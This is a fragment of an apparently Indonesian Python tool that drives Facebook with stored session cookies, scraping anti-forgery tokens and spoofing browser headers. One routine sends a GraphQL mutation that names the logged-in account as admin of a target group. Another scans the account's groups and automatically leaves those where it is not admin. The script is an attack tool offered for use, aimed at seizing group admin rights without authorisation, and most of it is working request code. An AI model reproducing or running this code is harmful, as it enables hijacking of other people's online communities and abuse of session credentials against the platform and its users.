        link = self.ses.get(f"https://web.facebook.com/groups/{id_grup}/members", cookies=cook, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}).text
        date = {'av': user, '_user': user, 'a': '1', 'req': '1a','hs': re.search('"haste_session":"(.*?)",',str(link)).group(1), 'dpr': '1.5', 'ccg': 'GOOD', 'rev': re.search('{"rev":(.*?)}',str(link)).group(1), 'hsi': re.search('"hsi":"(.*?)",',str(link)).group(1),'comet_req': '15', 'fb_dtsg': re.search('"DTSGInitialData":{"token":"(.*?)"}',str(link)).group(1), "jazoest": re.search('&jazoest=(.*?)"', str(link)).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(link)).group(1), 'spin_b': 'trunk', 'spin_r': re.search('"__spin_r":(.*?),', str(link)).group(1), 'spin_t': re.search('"__spin_t":(.*?),',str(link)).group(1), 'fb_api_caller_class': 'RelayModern'}
        head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Origin':'https://www.facebook.com','Referer':'https://www.facebook.com/pages/creation/?ref_type=launch_point','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','X-Fb-Friendly-Name': '','X-Fb-Lsd': date['lsd']}
        date.update({'fb_api_req_friendly_name': 'GroupsCometMembersInviteAdminMutation', 'variables': json.dumps({"groupID": id_grup,"memberID": user,"input":{"admin_type":"admin","group_id": id_grup,"source":"member_list","user_id": user,"actor_id": user,"client_mutation_id":"1"},"scale": "2","isContextualProfile": False}), 'server_timestamps':'true', 'doc_id': '7296704937013412'})
        head.update({'X-Fb-Friendly-Name': date['fb_api_req_friendly_name']})
        post = self.ses.post('https://www.facebook.com/api/graphql/',data=date, headers=head, cookies=cook).text
        if "Gagal Menambah Admin" in post:teks = "Gagal"
        elif "Kesalahan Kueri" in post:teks = "Kesalahan"
        else:teks = "Berhasil"
        return teks

    def dump_join(self):
        try:
            link = self.ses.get(f"{self.url}/groups/?seemore", cookies=self.cookie).text
            cari = re.findall('<a href="(.*?)">(.*?)</a>', str(link))
            for x in cari:
                if "home.php?" in x[0] or "profile.php" in x[0] or "pages" in x[0]:pass
                elif "/groups/?category=membership" in x[0] or "/groups/create/?create_ref=groups_tab" in x[0]:pass
                elif "groups" in x[0]:
                    for i in re.findall("groups/(.*?)/", x[0]):
                        curl = self.ses.get(f"{self.url}/groups/{i}?view=members", cookies=self.cookie).text
                        if "Hapus dari Admin" in str(curl):pass
                        #elif "Admin dan Moderator" not in str(curl):print(f"[*] cek grup: https://web.facebook.com/groups/{i}/members")
                        else:
                            idGP = re.findall('group_id=(.*?)&amp', str(curl))[0]
                            self.keluar_grup(idGP, x[1])
        except Exception as e:exit(e)

    def keluar_grup(self, id_grup, nama):
        user = re.findall("c_user=(.*?);", str(self.cookie))[0]
        link = self.ses.get("https://web.facebook.com/groups/joins/?nav_source=tab", cookies=self.cookie, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}).text
        varz = {"imageMediaType":"image/x-auto","input":{"attribution_id_v2":"GroupsCometJoinsRoot.react,comet.groups.joins,via_cold_start,1688226830953,776103,,","group_id":id_grup,"actor_id":user,"client_mutation_id":"1"},"inviteShortLinkKey":"null","isChainingRecommendationUnit":False,"isEntityMenu":False,"ordering":["viewer_added"],"scale":1.5,"groupID":id_grup,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":False,"__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":True,"__relay_internal__pv__GroupsCometEntityMenuUseChatThumbnailsrelayprovider":True,"__relay_internal__pv__GroupsCometHasLeftRailNavImprovementrelayprovider":True,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":False}
        date = {'av': user, '__user': user, '__req': 'la', '__hs': re.search('"haste_session":"(.*?)",',str(link)).group(1), 'dpr': '1.5', '__ccg': 'GOOD', '__rev': re.search('{"rev":(.*?)}',str(link)).group(1), '__hsi': re.search('"hsi":"(.*?)",',str(link)).group(1), '__comet_req': '15', 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"',str(link)).group(1), 'jazoest': re.search('&jazoest=(.*?)",',str(link)).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(link)).group(1), '__spin_r': re.search('"__spin_r":(.*?),',str(link)).group(1), '__spin_b': 'trunk', '__spin_t': re.search('"__spin_t":(.*?),',str(link)).group(1), 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'GroupCometLeaveForumMutation', 'variables': json.dumps(varz), 'server_timestamps': 'true', 'doc_id': '6048136201959478'}
        head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://web.facebook.com', 'referer': 'https://web.facebook.com/groups/joins/?nav_source=tab', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.106", "Google Chrome";v="114.0.5735.106"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.19.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'viewport-width': '906', 'x-asbd-id': '129477', 'x-fb-friendly-name': 'GroupCometLeaveForumMutation', 'x-fb-lsd': date["lsd"]}
        hasl = self.ses.post('https://web.facebook.com/api/graphql/', cookies=self.cookie, headers=head, data=date).json()
        if "Kesalahan Kueri" in hasl:pass
        else:print(f"\r[*] {nama}\n[#] berhasil keluar\n")

def prem_puan_puan_puan():
    try:
        data = json.load(open("mmk.json"))
        YoWaimo(data).menu()
    except Exception as e:exit(e)

prem_puan_puan_puan()